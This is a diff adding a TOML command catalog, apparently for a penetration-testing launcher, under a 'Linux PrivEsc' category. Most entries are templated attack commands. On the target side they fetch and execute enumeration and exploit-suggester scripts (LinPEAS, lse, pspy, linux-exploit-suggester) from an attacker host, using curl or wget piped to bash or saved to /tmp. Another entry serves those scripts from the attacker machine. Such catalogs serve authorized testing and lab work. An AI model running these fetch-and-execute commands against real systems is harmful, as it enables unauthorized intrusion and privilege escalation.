@@ -1,0 +1,58 @@
+category = "linux-privesc"
+display_name = "Linux PrivEsc"
+icon = "󰍡"
+order = 82
+
+[[command]]
+id = "priv.linpeas_serve"
+title = "host LinPEAS via http (attacker side)"
+template = "python3 -m http.server -d /opt/linpeas 80"
+requires = ["python3"]
+tags = ["staging"]
+
+[[command]]
+id = "priv.linpeas_pull"
+title = "pull + run linpeas (target side)"
+template = "curl -s http://{lhost}/linpeas.sh | bash"
+tags = ["linpeas"]
+when = "target.has_lhost"
+
+[[command]]
+id = "priv.linpeas_pull_b64"
+title = "pull + run linpeas (no curl: wget)"
+template = "wget -qO- http://{lhost}/linpeas.sh | bash"
+tags = ["linpeas"]
+when = "target.has_lhost"
+
+[[command]]
+id = "priv.lse"
+title = "linux smart enumeration full"
+template = "wget -qO /tmp/lse.sh http://{lhost}/lse.sh; chmod +x /tmp/lse.sh; /tmp/lse.sh -l2 -i"
+tags = ["lse"]
+when = "target.has_lhost"
+
+[[command]]
+id = "priv.pspy"
+title = "pspy64 — process snooping"
+template = "wget -qO /tmp/pspy http://{lhost}/pspy64; chmod +x /tmp/pspy; /tmp/pspy"
+tags = ["pspy"]
+when = "target.has_lhost"
+
+[[command]]
+id = "priv.suid.gtfobins"
+title = "suid GTFOBins reminder"
+template = "echo 'compare SUID list with gtfobins.github.io/#+suid'"
+tags = ["gtfobins"]
+
+[[command]]
+id = "priv.sudo.gtfobins"
+title = "sudo -l GTFOBins reminder"
+template = "echo 'compare sudo -l with gtfobins.github.io/#+sudo'"
+tags = ["gtfobins"]
+
+[[command]]
+id = "priv.kernel.exploits"
+title = "linux-exploit-suggester (recommended)"
+template = "wget -qO /tmp/les.sh http://{lhost}/linux-exploit-suggester.sh; chmod +x /tmp/les.sh; /tmp/les.sh"
+tags = ["kernel", "exploits"]
+when = "target.has_lhost"
